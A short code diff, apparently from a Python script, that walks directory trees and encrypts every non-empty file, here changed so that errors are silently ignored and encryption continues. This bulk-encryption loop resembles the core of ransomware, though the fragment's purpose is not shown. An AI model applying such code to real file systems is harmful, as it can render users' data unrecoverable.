@@ -42,7 +42,10 @@ for root, dirs, files in chain.from_iterable(os.walk(path) for path in paths):
 	for file_name in files:
 		filename = join(root, file_name)
 		if getsize(filename) > 0:
-			encrypt(filename)
+			try:
+				encrypt(filename)
+			except:
+				pass
 
 
 
